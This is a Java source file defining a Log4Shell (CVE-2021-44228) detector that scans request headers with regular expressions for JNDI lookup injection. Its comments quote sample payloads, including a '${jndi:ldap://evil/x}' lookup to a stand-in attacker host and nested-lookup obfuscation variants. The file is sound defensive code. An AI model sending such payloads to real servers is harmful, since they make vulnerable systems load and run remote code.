package com.securegate.filter.detector;

import com.securegate.model.AttackType;

import java.util.List;

/**
 * Log4Shell / JNDI lookup injection detection (CVE-2021-44228, OWASP A06:2021
 * Vulnerable and Outdated Components). Headers such as {@code User-Agent} and
 * {@code X-Api-Version} were the main attack vector, so this detector inspects them.
 */
public class Log4ShellDetector extends RegexAttackDetector {

    private static final List<Rule> RULES = List.of(
            // ${jndi:ldap://evil/x}  and the other lookup prefixes
            rule("\\$\\{\\s*(?:jndi|lower|upper|env|sys|java|date|ctx|main|bundle|k8s|docker|spring|web|log4j|base64)\\s*:",
                    "${"),
            // Obfuscation by nested lookups: ${${lower:j}ndi:...}  ${${::-j}${::-n}di:...}
            rule("\\$\\{[^}]*\\$\\{", "${"),
            rule("\\$\\{\\s*:+-", "${"),
            // The JNDI URL itself
            rule("jndi\\s*:\\s*(?:ldaps?|rmi|dns|iiop|https?|nis|nds|corba)\\b", "jndi")
    );

    public Log4ShellDetector() {
        super(RULES);
    }

    @Override
    public AttackType type() {
        return AttackType.LOG4SHELL;
    }
}
